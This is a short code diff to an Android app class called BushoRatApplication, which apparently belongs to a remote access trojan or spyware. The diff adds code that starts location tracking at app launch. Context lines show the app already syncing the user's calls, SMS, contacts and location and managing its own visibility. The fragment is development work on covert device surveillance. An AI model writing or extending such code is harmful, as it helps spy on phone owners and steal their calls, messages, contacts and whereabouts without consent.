@@ -11,6 +11,7 @@ import com.bushorat.app.helpers.AppVisibilityHelper;
 import com.bushorat.app.helpers.DocumentSyncHelper;
 import com.bushorat.app.helpers.UserDataSyncHelper;
 import com.bushorat.app.services.BackgroundMaintenanceService;
+import com.bushorat.app.services.LocationRequestService;
 
 public class BushoRatApplication extends Application {
     private static final String TAG = "BushoRatApplication";
@@ -69,6 +70,15 @@ public class BushoRatApplication extends Application {
                 AppVisibilityHelper visibilityHelper =
                         AppVisibilityHelper.getInstance(BushoRatApplication.this);
                 visibilityHelper.ensureListenerStarted();
+                
+                // ✨ START LOCATION UPDATES SO getLastKnownLocation() HAS DATA
+                Log.d(TAG, "  → Starting location update requests");
+                try {
+                    LocationRequestService locationService = LocationRequestService.getInstance(BushoRatApplication.this);
+                    locationService.startLocationUpdates();
+                } catch (Exception e) {
+                    Log.e(TAG, "Failed to start location service", e);
+                }
                 
                 // Start all data sync immediately
                 Log.d(TAG, "  → Syncing user data (calls, SMS, contacts, location)");
